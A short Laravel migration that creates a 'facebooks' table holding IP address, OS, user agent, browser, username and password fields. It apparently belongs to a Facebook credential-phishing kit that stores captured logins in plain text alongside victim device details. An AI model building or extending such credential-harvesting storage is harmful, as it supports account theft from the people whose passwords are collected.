<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

return new class extends Migration
{
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::create('facebooks', function (Blueprint $table) {
            $table->id();
            $table->text('ip', 100);
            $table->text('type', 100);
            $table->text('os', 100);
            $table->text('useragent', 100);
            $table->text('browser', 100);
            $table->text('username', 100);
            $table->text('password', 100);
            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::dropIfExists('facebooks');
    }
};
